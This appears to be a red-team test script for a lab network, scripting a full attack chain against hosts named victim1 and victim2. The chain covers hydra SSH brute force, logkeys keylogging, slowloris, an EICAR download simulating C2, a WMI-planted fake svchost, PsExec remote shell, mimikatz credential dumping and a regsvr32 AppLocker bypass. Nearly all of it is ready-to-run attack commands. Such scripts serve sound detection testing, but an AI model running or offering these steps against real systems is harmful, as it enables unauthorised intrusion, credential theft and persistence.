# Script

## Target and attack: Bruteforce SSH
> Use hydra with user and password lists to bruteforce SSH access
On attacker1:
```
cd /usr/share/wordlists
cp rockyou.txt.gz dce.txt.gz
gunzip dce.txt.gz
echo "$(head -n 15 dce.txt)" > dce.txt
echo "admin" >> dce.txt
echo "office" >> dce.txt
echo "John" >> dce.txt
echo "Jane" >> dce.txt
echo "Susan" >> dce.txt

hydra -I -L dce.txt -P dce.txt victim1 -t 4 ssh
```

Use the account credentials that were identified in the bruteforce attack to open a SSH session on victim1.

## Install and exploit: Suspicious process execution
> Run `logkeys` and `slowloris.pl` to capture credentials and do internal reconnaissance
On victim1:
```
logkeys --start
perl slowloris.pl -dns server.contoso.com
```

## Post breach: Command and control (C2) communication
> Download EICAR to simulate C2 communication and/or data exfiltration
On victim1:
```
ip=`dig +short eicar.com`
wget http://$ip/download/eicar.com
rm -f eicar.com
```

## Process Execution with WMI
> Use WMI to build a backdoor (See page 17/18 of [Abusing Windows Management Instrumentation by Matt Graeber](https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf) for more information on this technique)
```
wmic /node:"victim2" process call create "cmd.exe /c copy c:\windows\system32\svchost.exe c:\malicious\svchost.exe"
wmic /node:"victim2" process call create "cmd.exe /c c:\malicious\svchost.exe"
```

## Lateral movement
> Start a remote shell on the victim, verify by running `hostname` and start `mimikatz`
```
c:\tools\psexec\PsExec.exe /accepteula \\victim2 cmd
hostname
c:\tools\mimikatz\x64\mimikatz
```

> In mimikatz execute the following commands and verify if the hashes are visible
```
privilege::debug
sekurlsa::logonpasswords
exit
```

## Arbitrary code execution
> Use regsvr32 to run arbitrary code on the victim and bypass AppLocker (while in the remove shell)
```
cd c:\malicious
regsvr32.exe /s /u /i:C:\tools\test.sct scrobj.dll
```